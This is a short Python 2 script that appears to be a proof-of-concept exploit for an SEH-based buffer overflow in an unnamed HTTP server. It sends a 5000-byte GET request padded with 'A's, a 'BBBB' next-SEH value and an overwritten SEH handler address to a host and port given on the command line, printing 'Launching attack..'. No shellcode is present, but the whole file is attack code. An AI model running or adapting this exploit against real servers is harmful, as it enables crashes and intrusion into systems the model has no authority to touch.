#!/usr/bin/python

from socket import *
import sys, struct

if len(sys.argv) != 3:
    print "[*] Usage: python %s <ip> <port>" %sys.argv[0]
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

totaljunk = 5000
junk = "A" * 4131
nseh = "BBBB"
seh = struct.pack('<L', 0x0041e8f7)		#0x00405329
sisa = "D" * (totaljunk - len(junk+nseh+seh))
payload = junk+nseh+seh+sisa

print "[!] Connecting to %s on port %d" % (host,port)
s = socket(AF_INET, SOCK_STREAM)

try:
	s.connect((host,port))
	print "[+] Launching attack.."
	s.send ("GET /" + payload + "HTTP/1.0" + "\x00" + "\r\n\r\n\r\n")
	s.close()
except:
	print "[x] Could not connect to the server x_x"
	sys.exit()
